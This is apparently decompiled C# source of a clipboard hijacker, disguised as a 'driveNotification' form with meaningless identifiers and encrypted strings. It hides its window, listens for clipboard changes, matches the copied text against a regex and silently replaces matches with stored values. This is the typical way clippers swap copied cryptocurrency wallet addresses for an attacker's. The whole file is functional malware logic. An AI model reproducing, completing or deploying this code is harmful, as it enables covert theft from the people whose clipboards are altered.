using System;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7;

public sealed class driveNotification
{
	public class NotificationForm : Form
	{
		[CompilerGenerated]
		private sealed class StartAt
		{
			public string Types;

			public void Demand()
			{
				Types = Clipboard.GetText();
			}
		}

		[CompilerGenerated]
		private sealed class IsTypeRef
		{
			public string get_ControlThread;

			public void get_OEMCodePage()
			{
				Clipboard.SetText(get_ControlThread);
			}
		}

		private static string EnumEvents = GetText();

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = ((Form)this).get_CreateParams();
				createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
				return createParams;
			}
		}

		public NotificationForm()
		{
			Wait.ControlAppDomain.SetParent(((Control)this).get_Handle(), Wait.ControlAppDomain.EditorBrowsableState);
			Wait.ControlAppDomain.AddClipboardFormatListener(((Control)this).get_Handle());
		}

		private bool _FlushAsyncInternal_d__38(Regex regex_0)
		{
			if (regex_0.Match(EnumEvents).Success)
			{
				return (byte)Convert.ToInt32("1", 2) != 0;
			}
			return false;
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).get_Msg() == Convert.ToInt32("31d", 16))
			{
				EnumEvents = GetText();
				string enumEvents = EnumEvents;
				string string_ = "游渹湫";
				_003CModule_003E.smethod_0(ref string_, new object[3] { "ẩ䉈", '\u0c3a', 303 });
				if (enumEvents.StartsWith(string_))
				{
					if (_FlushAsyncInternal_d__38(Wait.PreserveSigAttribute) && !EnumEvents.Contains(Wait.AbandonedMutexException))
					{
						string text = Wait.PreserveSigAttribute.Replace(EnumEvents, Wait.AbandonedMutexException);
						SetText(text);
					}
				}
				else if (_FlushAsyncInternal_d__38(Wait.PreserveSigAttribute) && !EnumEvents.Contains(Wait.CompareNotLessThan))
				{
					string text2 = Wait.PreserveSigAttribute.Replace(EnumEvents, Wait.CompareNotLessThan);
					SetText(text2);
				}
			}
			((Form)this).WndProc(ref m);
		}

		public static string GetText()
		{
			string Types = string.Empty;
			Thread thread = new Thread((ThreadStart)delegate
			{
				Types = Clipboard.GetText();
			});
			thread.SetApartmentState((ApartmentState)((Array)(object)string.Empty).Length);
			thread.Start();
			thread.Join();
			return Types;
		}

		public static void SetText(string txt)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				Clipboard.SetText(txt);
			});
			thread.SetApartmentState((ApartmentState)Convert.ToInt32("0", 16));
			thread.Start();
			thread.Join();
		}
	}
}
